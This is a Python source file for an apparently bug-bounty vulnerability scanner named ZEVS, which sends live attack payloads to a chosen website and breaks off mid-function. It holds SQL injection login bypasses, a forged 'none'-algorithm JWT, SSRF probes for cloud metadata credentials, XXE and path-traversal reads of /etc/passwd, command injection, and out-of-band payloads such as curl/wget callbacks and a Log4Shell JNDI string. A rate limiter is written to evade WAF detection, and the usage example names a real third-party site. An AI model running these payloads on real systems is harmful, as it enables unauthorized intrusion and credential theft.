#!/usr/bin/env python3
"""
ZEVS - Deep Web Vulnerability Scanner
Lightweight scanner designed for bug bounty hunters
Author: Z3VS Team
Usage: python zevs.py <target>

LEGAL DISCLAIMER:
This tool is for authorized security testing only.
Only use on systems you own or have explicit written permission to test.
Unauthorized access to computer systems is illegal.
The authors are not responsible for misuse of this tool.
"""

import subprocess
import sys
import json
import time
import re
from urllib.parse import urlparse, urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed


class ZevsScanner:
    def __init__(self, target):
        if not target.startswith("http"):
            target = "https://" + target
        self.target = target
        self.domain = urlparse(target).netloc
        self.findings = []
        self.tested_urls = set()

    def log(self, msg, level="INFO"):
        colors = {
            "INFO": "\033[94m[*]\033[0m",
            "SUCCESS": "\033[92m[+]\033[0m",
            "WARNING": "\033[93m[!]\033[0m",
            "CRITICAL": "\033[91m[!!!]\033[0m",
        }
        print(f"{colors.get(level, '[*]')} {msg}")

    def curl(self, url, method="GET", headers=None, data=None, follow_redirects=False):
        """Execute curl with proper error handling"""
        cmd = ["curl", "-s", "-i", "--max-time", "10", "-k"]

        if not follow_redirects:
            cmd.append("-L")

        if method != "GET":
            cmd.extend(["-X", method])

        if headers:
            for k, v in headers.items():
                cmd.extend(["-H", f"{k}: {v}"])
        else:
            cmd.extend(
                [
                    "-H",
                    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                ]
            )

        if data:
            if isinstance(data, dict):
                data = json.dumps(data)
            cmd.extend(["--data", data])

        cmd.append(url)

        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
            return result.stdout
        except:
            return ""

    def add_finding(self, vuln_type, severity, url, description, proof=""):
        """Add finding with deduplication"""
        finding_key = f"{vuln_type}:{url}"
        if finding_key not in self.tested_urls:
            self.tested_urls.add(finding_key)
            self.findings.append(
                {
                    "type": vuln_type,
                    "severity": severity,
                    "url": url,
                    "description": description,
                    "proof": proof[:500] if proof else "",
                }
            )
            self.log(
                f"{severity}: {vuln_type} at {url}",
                "CRITICAL" if severity == "CRITICAL" else "WARNING",
            )
            return True
        return False

    def test_idor_deep(self):
        """Deep IDOR testing with multiple techniques"""
        self.log("Testing IDOR vulnerabilities (Deep Scan)...", "INFO")

        # Test multiple endpoints with different ID formats
        endpoints = [
            "/api/users/{id}",
            "/api/user/{id}",
            "/api/profile/{id}",
            "/api/resumes/{id}",
            "/api/resume/{id}",
            "/api/documents/{id}",
            "/api/orders/{id}",
            "/api/negotiations/{id}",
            "/api/messages/{id}",
            "/api/applications/{id}",
            "/users/{id}",
            "/profile/{id}",
            "/account/{id}",
        ]

        # Test with different ID values
        test_ids = [1, 2, 100, 1000, "00000000-0000-0000-0000-000000000001"]

        for endpoint_template in endpoints:
            for test_id in test_ids:
                endpoint = endpoint_template.replace("{id}", str(test_id))
                url = urljoin(self.target, endpoint)

                response = self.curl(url)

                # Check for 200 OK with sensitive data
                if "HTTP/1.1 200" in response or "HTTP/2 200" in response:
                    # Look for PII
                    if any(
                        keyword in response.lower()
                        for keyword in [
                            "email",
                            "phone",
                            "address",
                            "passport",
                            "ssn",
                            "credit",
                        ]
                    ):
                        self.add_finding(
                            "IDOR",
                            "HIGH",
                            url,
                            f"Can access user data without authentication (ID: {test_id})",
                            response[:500],
                        )
                        return True

        self.log("No IDOR found (endpoints require authentication)", "INFO")
        return False

    def test_auth_bypass_deep(self):
        """Deep authentication bypass testing"""
        self.log("Testing authentication bypass (Deep Scan)...", "INFO")

        # Test 1: JWT none algorithm
        none_jwt = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwiaWF0IjoxNTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ."

        auth_endpoints = [
            "/api/me",
            "/api/user",
            "/api/profile",
            "/api/admin",
            "/admin/dashboard",
        ]

        for endpoint in auth_endpoints:
            url = urljoin(self.target, endpoint)
            response = self.curl(url, headers={"Authorization": f"Bearer {none_jwt}"})

            if (
                "HTTP/1.1 200" in response or "HTTP/2 200" in response
            ) and "email" in response.lower():
                self.add_finding(
                    "Authentication Bypass - JWT None Algorithm",
                    "CRITICAL",
                    url,
                    "Server accepts JWT with 'none' algorithm - complete authentication bypass",
                    response[:500],
                )
                return True

        # Test 2: SQL injection in login
        sqli_payloads = [
            {"username": "admin' OR '1'='1", "password": "anything"},
            {"username": "admin'--", "password": "anything"},
            {"username": "' OR 1=1--", "password": "anything"},
        ]

        login_endpoints = ["/api/login", "/api/auth/login", "/login", "/auth/login"]

        for endpoint in login_endpoints:
            url = urljoin(self.target, endpoint)
            for payload in sqli_payloads:
                response = self.curl(
                    url,
                    method="POST",
                    headers={"Content-Type": "application/json"},
                    data=payload,
                )

                if ("HTTP/1.1 200" in response or "HTTP/2 200" in response) and any(
                    word in response.lower() for word in ["token", "success", "logged"]
                ):
                    self.add_finding(
                        "SQL Injection in Authentication",
                        "CRITICAL",
                        url,
                        f"SQL injection allows authentication bypass: {payload['username']}",
                        response[:500],
                    )
                    return True

        self.log("No authentication bypass found", "INFO")
        return False

    def test_ssrf_deep(self):
        """Deep SSRF testing"""
        self.log("Testing SSRF vulnerabilities (Deep Scan)...", "INFO")

        # Cloud metadata endpoints
        ssrf_payloads = [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://169.254.169.254/metadata/v1/",
            "http://127.0.0.1:8080",
            "http://localhost:8080",
            "file:///etc/passwd",
            "file:///c:/windows/win.ini",
        ]

        # Common SSRF parameters
        ssrf_params = [
            "url",
            "uri",
            "link",
            "src",
            "source",
            "target",
            "dest",
            "redirect",
            "fetch",
            "proxy",
            "webhook",
        ]

        ssrf_endpoints = [
            "/api/fetch",
            "/api/proxy",
            "/api/webhook",
            "/api/import",
            "/api/download",
            "/fetch",
            "/proxy",
        ]

        for endpoint in ssrf_endpoints:
            for param in ssrf_params:
                for payload in ssrf_payloads:
                    url = urljoin(self.target, f"{endpoint}?{param}={payload}")
                    response = self.curl(url)

                    # Check for cloud metadata
                    if any(
                        keyword in response.lower()
                        for keyword in [
                            "ami-",
                            "instance-id",
                            "hostname",
                            "credentials",
                            "root:x:0",
                        ]
                    ):
                        self.add_finding(
                            "SSRF",
                            "CRITICAL",
                            url,
                            f"SSRF allows access to internal resources: {payload}",
                            response[:500],
                        )
                        return True

        self.log("No SSRF found", "INFO")
        return False

    def test_xxe_deep(self):
        """Deep XXE testing"""
        self.log("Testing XXE vulnerabilities (Deep Scan)...", "INFO")

        xxe_payloads = [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
        ]

        xxe_endpoints = [
            "/api/upload",
            "/api/import",
            "/api/parse",
            "/upload",
            "/import",
        ]

        for endpoint in xxe_endpoints:
            url = urljoin(self.target, endpoint)
            for payload in xxe_payloads:
                response = self.curl(
                    url,
                    method="POST",
                    headers={"Content-Type": "application/xml"},
                    data=payload,
                )

                if (
                    "root:x:0" in response
                    or "[extensions]" in response
                    or "ami-" in response
                ):
                    self.add_finding(
                        "XXE - XML External Entity",
                        "CRITICAL",
                        url,
                        "XXE allows reading server files",
                        response[:500],
                    )
                    return True

        self.log("No XXE found", "INFO")
        return False

    def test_graphql_deep(self):
        """Deep GraphQL testing"""
        self.log("Testing GraphQL vulnerabilities (Deep Scan)...", "INFO")

        graphql_endpoints = [
            "/graphql",
            "/api/graphql",
            "/v1/graphql",
            "/graphql/v1",
        ]

        for endpoint in graphql_endpoints:
            url = urljoin(self.target, endpoint)

            # Test 1: Introspection
            introspection = {"query": "{__schema{types{name,fields{name}}}}"}
            response = self.curl(
                url,
                method="POST",
                headers={"Content-Type": "application/json"},
                data=introspection,
            )

            if (
                "HTTP/1.1 200" in response or "HTTP/2 200" in response
            ) and "types" in response:
                # Test 2: IDOR via GraphQL
                idor_query = {"query": "{user(id:1){email,phone,name,password}}"}
                response2 = self.curl(
                    url,
                    method="POST",
                    headers={"Content-Type": "application/json"},
                    data=idor_query,
                )

                if (
                    "HTTP/1.1 200" in response2 or "HTTP/2 200" in response2
                ) and "email" in response2.lower():
                    self.add_finding(
                        "GraphQL IDOR",
                        "HIGH",
                        url,
                        "Can access user data via GraphQL without authentication",
                        response2[:500],
                    )
                    return True

        self.log("No GraphQL vulnerabilities found", "INFO")
        return False

    def test_oauth_deep(self):
        """Deep OAuth testing"""
        self.log("Testing OAuth vulnerabilities (Deep Scan)...", "INFO")

        oauth_endpoints = [
            "/oauth/authorize",
            "/auth/oauth",
            "/oauth2/authorize",
            "/login/oauth",
        ]

        for endpoint in oauth_endpoints:
            # Test redirect_uri manipulation
            url = urljoin(
                self.target,
                f"{endpoint}?client_id=test&redirect_uri=https://evil.com&response_type=code",
            )
            response = self.curl(url)

            # Check if redirects to evil.com
            if "Location:" in response and "evil.com" in response:
                self.add_finding(
                    "OAuth Open Redirect",
                    "HIGH",
                    url,
                    "OAuth redirect_uri not validated - token theft possible",
                    response[:500],
                )
                return True

        self.log("No OAuth vulnerabilities found", "INFO")
        return False

    def test_business_logic_deep(self):
        """Deep business logic testing"""
        self.log("Testing business logic flaws (Deep Scan)...", "INFO")

        # Test 1: Negative price
        price_endpoints = ["/api/order", "/api/checkout", "/api/payment"]

        for endpoint in price_endpoints:
            url = urljoin(self.target, endpoint)
            payload = {"item_id": 1, "quantity": 1, "price": -100}
            response = self.curl(
                url,
                method="POST",
                headers={"Content-Type": "application/json"},
                data=payload,
            )

            if (
                "HTTP/1.1 200" in response or "HTTP/2 200" in response
            ) and "success" in response.lower():
                self.add_finding(
                    "Business Logic - Negative Price",
                    "HIGH",
                    url,
                    "Server accepts negative prices - can get paid to buy items",
                    response[:500],
                )
                return True

        self.log("No business logic flaws found", "INFO")
        return False

    def test_rce_deep(self):
        """Deep RCE testing"""
        self.log("Testing RCE vulnerabilities (Deep Scan)...", "INFO")

        rce_payloads = [
            ";whoami",
            "|whoami",
            "`whoami`",
            "$(whoami)",
            ";id",
            "|id",
        ]

        rce_endpoints = [
            "/api/ping",
            "/api/exec",
            "/api/command",
            "/ping",
            "/exec",
        ]

        rce_params = ["host", "cmd", "command", "exec", "ip"]

        for endpoint in rce_endpoints:
            for param in rce_params:
                for payload in rce_payloads:
                    url = urljoin(self.target, f"{endpoint}?{param}=127.0.0.1{payload}")
                    response = self.curl(url)

                    if any(
                        keyword in response.lower()
                        for keyword in ["uid=", "gid=", "root", "www-data", "nginx"]
                    ):
                        self.add_finding(
                            "Remote Code Execution",
                            "CRITICAL",
                            url,
                            f"RCE via command injection: {payload}",
                            response[:500],
                        )
                        return True

        self.log("No RCE found", "INFO")
        return False

    def test_lfi_deep(self):
        """Deep LFI testing"""
        self.log("Testing LFI vulnerabilities (Deep Scan)...", "INFO")

        lfi_payloads = [
            "../../../../etc/passwd",
            "..\\..\\..\\..\\windows\\win.ini",
            "....//....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        ]

        lfi_endpoints = ["/api/file", "/api/download", "/file", "/download", "/read"]
        lfi_params = ["file", "path", "filename", "doc", "document"]

        for endpoint in lfi_endpoints:
            for param in lfi_params:
                for payload in lfi_payloads:
                    url = urljoin(self.target, f"{endpoint}?{param}={payload}")
                    response = self.curl(url)

                    if "root:x:0" in response or "[extensions]" in response:
                        self.add_finding(
                            "Local File Inclusion",
                            "HIGH",
                            url,
                            f"LFI allows reading server files: {payload}",
                            response[:500],
                        )
                        return True

        self.log("No LFI found", "INFO")
        return False

    def test_sqli_deep(self):
        """Deep SQL injection testing"""
        self.log("Testing SQL injection (Deep Scan)...", "INFO")

        sqli_payloads = [
            "1' OR '1'='1",
            "1' OR '1'='1'--",
            "1' OR '1'='1'#",
            "1' UNION SELECT NULL--",
            "1' AND SLEEP(5)--",
        ]

        sqli_endpoints = [
            "/api/search",
            "/api/user",
            "/search",
            "/product",
            "/vacancy",
        ]

        sqli_params = ["id", "search", "q", "query", "user_id"]

        for endpoint in sqli_endpoints:
            for param in sqli_params:
                for payload in sqli_payloads:
                    url = urljoin(self.target, f"{endpoint}?{param}={payload}")
                    start_time = time.time()
                    response = self.curl(url)
                    elapsed = time.time() - start_time

                    # Check for SQL errors
                    if any(
                        error in response.lower()
                        for error in [
                            "sql",
                            "mysql",
                            "postgresql",
                            "oracle",
                            "syntax error",
                        ]
                    ):
                        self.add_finding(
                            "SQL Injection",
                            "CRITICAL",
                            url,
                            f"SQL injection detected: {payload}",
                            response[:500],
                        )
                        return True

                    # Check for time-based SQLi
                    if "SLEEP" in payload and elapsed > 5:
                        self.add_finding(
                            "SQL Injection - Time Based",
                            "CRITICAL",
                            url,
                            f"Time-based SQL injection: {payload}",
                            f"Response time: {elapsed}s",
                        )
                        return True

        self.log("No SQL injection found", "INFO")
        return False

    def test_xss_deep(self):
        """Deep XSS testing"""
        self.log("Testing XSS vulnerabilities (Deep Scan)...", "INFO")

        xss_payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
            "<svg onload=alert(1)>",
        ]

        xss_endpoints = ["/search", "/api/search", "/comment", "/api/comment"]
        xss_params = ["q", "search", "query", "text", "comment"]

        for endpoint in xss_endpoints:
            for param in xss_params:
                for payload in xss_payloads:
                    url = urljoin(self.target, f"{endpoint}?{param}={payload}")
                    response = self.curl(url)

                    # Check if payload is reflected without encoding
                    if payload in response and "HTTP/1.1 200" in response:
                        self.add_finding(
                            "Cross-Site Scripting (XSS)",
                            "MEDIUM",
                            url,
                            f"XSS payload reflected: {payload}",
                            response[:500],
                        )
                        return True

        self.log("No XSS found", "INFO")
        return False

    def generate_report(self):
        """Generate comprehensive report"""
        self.log("\n" + "=" * 60, "INFO")
        self.log("SCAN COMPLETE", "SUCCESS")
        self.log("=" * 60, "INFO")

        if not self.findings:
            self.log("\nNo vulnerabilities found", "INFO")
            self.log("\nPossible reasons:", "INFO")
            self.log("1. Target has strong security", "INFO")
            self.log("2. Endpoints require authentication", "INFO")
            self.log("3. Need manual testing with valid account", "INFO")
            self.log("\nRECOMMENDATION:", "WARNING")
            self.log("Create account and test authenticated endpoints", "INFO")
            self.log("Focus on IDOR, business logic, and race conditions", "INFO")
            return None

        # Sort by severity
        severity_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}
        self.findings.sort(key=lambda x: severity_order.get(x["severity"], 4))

        # Count by severity
        critical = sum(1 for f in self.findings if f["severity"] == "CRITICAL")
        high = sum(1 for f in self.findings if f["severity"] == "HIGH")
        medium = sum(1 for f in self.findings if f["severity"] == "MEDIUM")
        low = sum(1 for f in self.findings if f["severity"] == "LOW")

        self.log(f"\nTotal Findings: {len(self.findings)}", "SUCCESS")
        if critical > 0:
            self.log(f"  CRITICAL: {critical}", "CRITICAL")
        if high > 0:
            self.log(f"  HIGH: {high}", "WARNING")
        if medium > 0:
            self.log(f"  MEDIUM: {medium}", "INFO")
        if low > 0:
            self.log(f"  LOW: {low}", "INFO")

        # Print findings
        for i, finding in enumerate(self.findings, 1):
            level = (
                "CRITICAL" if finding["severity"] in ["CRITICAL", "HIGH"] else "WARNING"
            )
            self.log(f"\n[{i}] {finding['type']} - {finding['severity']}", level)
            self.log(f"    URL: {finding['url']}", "INFO")
            self.log(f"    Description: {finding['description']}", "INFO")

        # Save reports
        report = {
            "target": self.target,
            "scan_date": time.strftime("%Y-%m-%d %H:%M:%S"),
            "total_findings": len(self.findings),
            "critical": critical,
            "high": high,
            "medium": medium,
            "low": low,
            "findings": self.findings,
        }

        # JSON report
        with open("zevs_report.json", "w") as f:
            json.dump(report, f, indent=2)

        # Text report
        with open("zevs_report.txt", "w") as f:
            f.write("=" * 60 + "\n")
            f.write("ZEVS DEEP SCANNER REPORT\n")
            f.write("=" * 60 + "\n\n")
            f.write(f"Target: {self.target}\n")
            f.write(f"Scan Date: {report['scan_date']}\n")
            f.write(f"Total Findings: {len(self.findings)}\n")
            f.write(f"  CRITICAL: {critical}\n")
            f.write(f"  HIGH: {high}\n")
            f.write(f"  MEDIUM: {medium}\n")
            f.write(f"  LOW: {low}\n\n")

            for i, finding in enumerate(self.findings, 1):
                f.write(f"[{i}] {finding['type']} - {finding['severity']}\n")
                f.write("-" * 60 + "\n")
                f.write(f"URL: {finding['url']}\n")
                f.write(f"Description: {finding['description']}\n")
                if finding["proof"]:
                    f.write(f"Proof:\n{finding['proof']}\n")
                f.write("\n")

        self.log("\nReports saved:", "SUCCESS")
        self.log("  - zevs_report.json", "INFO")
        self.log("  - zevs_report.txt", "INFO")

        return report

    def scan(self):
        """Run deep scan"""
        self.log("=" * 60, "INFO")
        self.log("ZEVS - DEEP WEB VULNERABILITY SCANNER", "SUCCESS")
        self.log("Lightweight scanner for bug bounty hunters", "INFO")
        self.log("=" * 60, "INFO")
        self.log("\n⚠️  LEGAL DISCLAIMER:", "WARNING")
        self.log("This tool is for authorized testing only.", "WARNING")
        self.log("Ensure you have permission before scanning.", "WARNING")
        self.log("Unauthorized access is illegal.\n", "WARNING")
        self.log(f"Target: {self.target}", "INFO")
        self.log(f"Started: {time.strftime('%Y-%m-%d %H:%M:%S')}\n", "INFO")

        # Run all tests
        tests = [
            ("IDOR", self.test_idor_deep),
            ("Authentication Bypass", self.test_auth_bypass_deep),
            ("SSRF", self.test_ssrf_deep),
            ("XXE", self.test_xxe_deep),
            ("GraphQL", self.test_graphql_deep),
            ("OAuth", self.test_oauth_deep),
            ("Business Logic", self.test_business_logic_deep),
            ("RCE", self.test_rce_deep),
            ("LFI", self.test_lfi_deep),
            ("SQL Injection", self.test_sqli_deep),
            ("XSS", self.test_xss_deep),
        ]

        for test_name, test_func in tests:
            try:
                test_func()
            except Exception as e:
                self.log(f"Error in {test_name}: {str(e)}", "WARNING")

        # Generate report
        self.generate_report()


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python zevs.py <target>")
        print("Example: python zevs.py hh.ru")
        sys.exit(1)

    target = sys.argv[1]
    scanner = ZevsScanner(target)
    scanner.scan()
# ============================================================================
# ZEVS v2.0 - INTEGRATED MODULES
# ============================================================================


# === CVSS v3.1 Calculator ===
"""
CVSS v3.1 Calculator for Vulnerability Scoring
Automatically calculates severity scores for findings
"""

from typing import Dict


class CVSSCalculator:
    """Calculate CVSS v3.1 scores for vulnerabilities"""

    # CVSS v3.1 metric values
    METRICS = {
        "AV": {"N": 0.85, "A": 0.62, "L": 0.55, "P": 0.2},  # Attack Vector
        "AC": {"L": 0.77, "H": 0.44},  # Attack Complexity
        "PR": {"N": 0.85, "L": 0.62, "H": 0.27},  # Privileges Required
        "UI": {"N": 0.85, "R": 0.62},  # User Interaction
        "S": {"U": 0, "C": 1},  # Scope
        "C": {"N": 0, "L": 0.22, "H": 0.56},  # Confidentiality
        "I": {"N": 0, "L": 0.22, "H": 0.56},  # Integrity
        "A": {"N": 0, "L": 0.22, "H": 0.56},  # Availability
    }

    # Vulnerability type to CVSS vector mapping
    VULN_VECTORS = {
        "SQL Injection": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
        "RCE": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
        "XXE": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
        "SSRF": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:L",
        "IDOR": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N",
        "XSS": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
        "Auth Bypass": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        "LFI": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
        "CRLF Injection": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
        "Open Redirect": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:L/A:N",
        "CORS Misconfiguration": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N",
        "Log4Shell": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
        "Prototype Pollution": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        "Deserialization": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        "Race Condition": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N",
        "JWT Attack": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
        "GraphQL": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N",
        "OAuth": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N",
        "Subdomain Takeover": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
        "Request Smuggling": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
        "Cache Poisoning": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N",
    }

    @staticmethod
    def parse_vector(vector: str) -> Dict[str, str]:
        """Parse CVSS vector string into metrics dict"""
        metrics = {}
        parts = vector.split("/")[1:]  # Skip CVSS:3.1

        for part in parts:
            key, value = part.split(":")
            metrics[key] = value

        return metrics

    @staticmethod
    def calculate_base_score(metrics: Dict[str, str]) -> float:
        """Calculate CVSS base score from metrics"""

        # Extract metric values
        av = CVSSCalculator.METRICS["AV"][metrics["AV"]]
        ac = CVSSCalculator.METRICS["AC"][metrics["AC"]]
        pr = CVSSCalculator.METRICS["PR"][metrics["PR"]]
        ui = CVSSCalculator.METRICS["UI"][metrics["UI"]]
        scope = metrics["S"]
        c = CVSSCalculator.METRICS["C"][metrics["C"]]
        i = CVSSCalculator.METRICS["I"][metrics["I"]]
        a = CVSSCalculator.METRICS["A"][metrics["A"]]

        # Calculate Impact Sub Score (ISS)
        iss = 1 - ((1 - c) * (1 - i) * (1 - a))

        # Calculate Impact
        if scope == "U":
            impact = 6.42 * iss
        else:
            impact = 7.52 * (iss - 0.029) - 3.25 * pow(iss - 0.02, 15)

        # Calculate Exploitability
        exploitability = 8.22 * av * ac * pr * ui

        # Calculate Base Score
        if impact <= 0:
            return 0.0

        if scope == "U":
            base_score = min(impact + exploitability, 10)
        else:
            base_score = min(1.08 * (impact + exploitability), 10)

        # Round up to 1 decimal
        return round(base_score, 1)

    @staticmethod
    def get_severity(score: float) -> str:
        """Convert CVSS score to severity rating"""
        if score == 0.0:
            return "INFO"
        elif score < 4.0:
            return "LOW"
        elif score < 7.0:
            return "MEDIUM"
        elif score < 9.0:
            return "HIGH"
        else:
            return "CRITICAL"

    @staticmethod
    def calculate_for_vuln(vuln_type: str) -> Dict:
        """
        Calculate CVSS score for vulnerability type

        Returns:
            Dict with score, severity, and vector
        """
        # Get vector for vulnerability type
        vector = CVSSCalculator.VULN_VECTORS.get(vuln_type)

        if not vector:
            # Default to medium severity for unknown types
            return {
                "score": 5.0,
                "severity": "MEDIUM",
                "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
            }

        # Parse and calculate
        metrics = CVSSCalculator.parse_vector(vector)
        score = CVSSCalculator.calculate_base_score(metrics)
        severity = CVSSCalculator.get_severity(score)

        return {"score": score, "severity": severity, "vector": vector}


# Test


# === Interactsh OOB Client ===
"""
Interactsh Client for Out-of-Band (OOB) Detection
Detects blind vulnerabilities via DNS/HTTP callbacks
"""

import json
import time
import hashlib
import secrets
from typing import List, Dict, Optional
from urllib.parse import urljoin
import subprocess


class InteractshClient:
    """Client for OOB detection using Interactsh or custom callback server"""

    def __init__(self, server: str = "oast.pro"):
        """
        Initialize Interactsh client

        Args:
            server: Interactsh server domain (default: oast.pro, alternatives: interact.sh)
        """
        self.server = server
        self.session_id = secrets.token_hex(16)
        self.interactions = []

    def generate_payload(self, identifier: str = None) -> str:
        """
        Generate unique callback URL

        Args:
            identifier: Optional identifier to track specific test

        Returns:
            Unique callback URL like: abc123.oast.pro
        """
        if identifier:
            unique_id = hashlib.md5(
                f"{self.session_id}-{identifier}".encode()
            ).hexdigest()[:12]
        else:
            unique_id = secrets.token_hex(6)

        return f"{unique_id}.{self.server}"

    def check_interactions(self, payload: str, timeout: int = 5) -> List[Dict]:
        """
        Check if callback was received

        Args:
            payload: The callback URL to check
            timeout: How long to wait for callback (seconds)

        Returns:
            List of interaction events (DNS queries, HTTP requests)
        """
        time.sleep(timeout)

        # Extract subdomain from payload
        subdomain = payload.split(".")[0]

        # Query Interactsh API for interactions
        api_url = f"https://{self.server}/api/poll?id={subdomain}"

        try:
            result = subprocess.run(
                ["curl", "-s", "-m", "10", api_url],
                capture_output=True,
                text=True,
                timeout=15,
            )

            if result.returncode == 0 and result.stdout:
                data = json.loads(result.stdout)
                if data and isinstance(data, list):
                    return data
        except:
            pass

        return []

    def test_blind_sqli(self, base_url: str, param: str) -> str:
        """Generate blind SQLi payload with OOB"""
        callback = self.generate_payload(f"sqli-{param}")

        # MySQL DNS exfiltration
        payload = f"' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',({callback}),'\\\\x')))"

        return payload, callback

    def test_blind_ssrf(self, identifier: str = "ssrf") -> str:
        """Generate SSRF callback URL"""
        callback = self.generate_payload(identifier)
        return f"http://{callback}", callback

    def test_blind_xxe(self, identifier: str = "xxe") -> tuple:
        """Generate XXE payload with OOB"""
        callback = self.generate_payload(identifier)

        xxe_payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://{callback}/xxe">
]>
<root>&xxe;</root>"""

        return xxe_payload, callback

    def test_blind_rce(self, identifier: str = "rce") -> tuple:
        """Generate RCE payloads with OOB"""
        callback = self.generate_payload(identifier)

        payloads = [
            f"curl http://{callback}/rce",
            f"wget http://{callback}/rce",
            f"nslookup {callback}",
            f"ping -c 1 {callback}",
        ]

        return payloads, callback

    def test_log4shell_oob(self, identifier: str = "log4j") -> tuple:
        """Generate Log4Shell payload with OOB"""
        callback = self.generate_payload(identifier)

        payload = f"${{jndi:ldap://{callback}/a}}"

        return payload, callback


# Standalone test


# === Smart Rate Limiter ===
"""
Smart Rate Limiter with Jitter
Avoids WAF detection and bans with intelligent request pacing
"""

import time
import random
from typing import Optional


class SmartRateLimiter:
    """Intelligent rate limiting to avoid WAF detection"""

    def __init__(self, requests_per_second: float = 5.0, jitter: float = 0.3):
        """
        Initialize rate limiter

        Args:
            requests_per_second: Target RPS (default: 5)
            jitter: Random variation 0-1 (default: 0.3 = 30% variation)
        """
        self.base_delay = 1.0 / requests_per_second
        self.jitter = jitter
        self.last_request_time = 0
        self.consecutive_errors = 0
        self.backoff_multiplier = 1.0

    def wait(self):
        """Wait before next request with jitter and adaptive backoff"""

        # Calculate delay with jitter
        jitter_amount = self.base_delay * self.jitter
        delay = self.base_delay + random.uniform(-jitter_amount, jitter_amount)

        # Apply backoff if we're getting rate limited
        delay *= self.backoff_multiplier

        # Ensure minimum time between requests
        elapsed = time.time() - self.last_request_time
        if elapsed < delay:
            time.sleep(delay - elapsed)

        self.last_request_time = time.time()

    def on_error(self, status_code: int):
        """
        Handle error response - adjust rate if needed

        Args:
            status_code: HTTP status code
        """
        # Rate limit indicators
        if status_code in [429, 503]:  # Too Many Requests, Service Unavailable
            self.consecutive_errors += 1

            # Exponential backoff
            self.backoff_multiplier = min(self.backoff_multiplier * 2, 8.0)

            # Sleep longer on rate limit
            time.sleep(self.backoff_multiplier * 2)

        elif status_code == 403:  # Forbidden - might be WAF
            self.consecutive_errors += 1
            self.backoff_multiplier = min(self.backoff_multiplier * 1.5, 4.0)
            time.sleep(1.0)

    def on_success(self):
        """Reset backoff on successful request"""
        if self.consecutive_errors > 0:
            self.consecutive_errors = max(0, self.consecutive_errors - 1)

        # Gradually reduce backoff
        if self.backoff_multiplier > 1.0:
            self.backoff_multiplier = max(1.0, self.backoff_multiplier * 0.9)

    def get_current_rps(self) -> float:
        """Get current effective requests per second"""
        effective_delay = self.base_delay * self.backoff_multiplier
        return 1.0 / effective_delay if effective_delay > 0 else 0

    def is_throttled(self) -> bool:
        """Check if we're currently being throttled"""
        return self.backoff_multiplier > 1.5


class WAFDetector:
    """Detect and adapt to WAF presence"""

    WAF_SIGNATURES = {
        "Cloudflare": ["cf-ray", "cloudflare"],
        "Imperva": ["x-iinfo", "incap_ses"],
        "Akamai": ["akamai", "x-akamai"],
        "AWS WAF": ["x-amzn-requestid", "x-amz-cf-id"],
        "F5 BIG-IP": ["bigipserver", "f5"],
        "ModSecurity": ["mod_security", "naxsi"],
    }

    @staticmethod
    def detect(headers: dict, body: str = "") -> Optional[str]:
        """
        Detect WAF from response

        Args:
            headers: Response headers (lowercase keys)
            body: Response body

        Returns:
            WAF name if detected, None otherwise
        """
        headers_lower = {k.lower(): v.lower() for k, v in headers.items()}
        body_lower = body.lower()

        for waf_name, signatures in WAFDetector.WAF_SIGNATURES.items():
